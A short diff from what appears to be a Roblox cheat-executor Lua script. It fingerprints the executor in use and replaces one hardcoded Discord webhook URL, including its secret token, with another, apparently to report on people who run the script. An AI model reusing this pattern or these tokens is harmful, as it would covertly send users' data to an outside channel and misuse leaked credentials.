@@ -47,7 +47,7 @@ local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "S
   or ("Shitty Exploit")
 
 --da wheebook is here
-local url = "https://discord.com/api/webhooks/1517163798908108840/QDW1ADLlqXmS4-Vke2PSyMo_hmTDsFNdOhS_ttpMK7lVp6Nj0d75BSnlc5eGsibHc7H8"
+local url = "https://discord.com/api/webhooks/1517553563083997224/oEnzLyIwbWEpBRtXfdfygvaeSsuUCPc3Q2zlgmytOP_WDZmY10m3ie_idPe8UStpTdTB"
 
 local data = {
     ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
